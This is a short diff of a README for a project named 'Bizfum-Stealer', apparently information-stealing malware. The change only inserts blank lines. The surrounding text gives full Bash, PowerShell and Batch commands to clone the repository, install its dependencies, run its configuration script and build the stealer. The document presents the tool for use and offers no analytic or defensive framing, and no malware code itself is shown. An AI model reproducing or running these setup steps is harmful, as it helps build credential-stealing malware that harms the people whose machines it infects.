@@ -23,6 +23,7 @@
 The installation process is straightforward. Clone the repository, run the config.py and then build.(bat/sh):
 
 **Bash**
+
 Configure:
 ```bash
 git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git && cd Bizfum-Stealer && pip install -r requirements.txt && python config.py
@@ -33,6 +34,7 @@ chmod +x build.sh && ./build.sh
 ```
 
 **Powershell**
+
 Configure:
 ```powershell
 git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git; cd Bizfum-Stealer; pip install -r requirements.txt && python config.py
@@ -42,6 +44,7 @@ Build:
 .\build.bat
 ```
 **Batch**
+
 Configure:
 ```cmd
 git clone https://github.com/UnknownWebPT/Bizfum-Stealer.git && cd Bizfum-Stealer && pip install -r requirements.txt && python config.py
